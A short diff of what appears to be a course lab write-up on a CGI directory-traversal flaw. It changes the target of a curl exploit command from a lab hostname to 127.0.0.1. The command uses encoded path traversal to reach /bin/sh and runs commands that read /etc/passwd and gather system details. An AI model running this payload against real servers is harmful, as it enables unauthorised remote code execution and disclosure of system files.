@@ -30,7 +30,7 @@ This vulnerability is trivial to exploit and results in directory traversal, loc
 
 Remote code execution:
 ```sh
-curl --path-as-is "http://website1.cpsc4270.local:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;ls -alh /etc/passwd;whoami;uname -a"
+curl --path-as-is "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;ls -alh /etc/passwd;whoami;uname -a"
 ```
 
 Example output:
